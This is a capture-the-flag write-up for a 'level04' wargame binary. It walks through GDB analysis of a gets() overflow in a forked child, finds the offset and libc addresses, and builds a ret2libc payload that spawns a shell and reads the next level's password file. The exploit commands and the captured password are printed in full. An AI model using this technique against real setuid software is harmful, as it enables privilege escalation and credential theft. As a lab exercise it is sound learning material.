```shell
$> ls -la
[...]
-rwsr-s---+ 1 level05 users   7797 Sep 10  2016 level04
[...]

$> ./level04 
Give me some shellcode, k
k
child is exiting...
```

Analyze with ghidra and disassembler the code in GDB

```c
// check source.c file
```

```shell
    [...]
    0x080486d6 <+14>:    call   0x8048550 <fork@plt>
    [...]
    0x0804875e <+150>:   call   0x80484b0 <gets@plt>
    [...]

    # fork() is called here to create a child process
    # gets() is called here in child process that is vulnerable to buffer overflow
```

Here we need use ret2libc technique to exploit the binary

```shell
$> gdb -q level04
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04 
[New process 2342]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2342]
0x41326641 in ?? ()

# set follow-fork-mode child to follow child process information
# the offset is 156

(gdb) b main
Breakpoint 1 at 0x80486cd
(gdb) r
Starting program: /home/users/level04/level04 

Breakpoint 1, 0x080486cd in main ()
(gdb) find __libc_start_main, +99999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.

# to know the address of /bin/sh in libc

(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

# to know the address of system in libc
```

```shell
$> (python -c "print '\x90' * 156 + '\xd0\xae\xe6\xf7' + '\x90\x90\x90\x90' + '\xec\x97\xf8\xf7'"; cat) | ./level04

# to execute the shellcode with ret2libc technique
# we need something like this:
# system address + system ret address + /bin/sh address
# here we only want to execute /bin/sh, so we can ignore the system ret address (just put a ramdom value)

Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```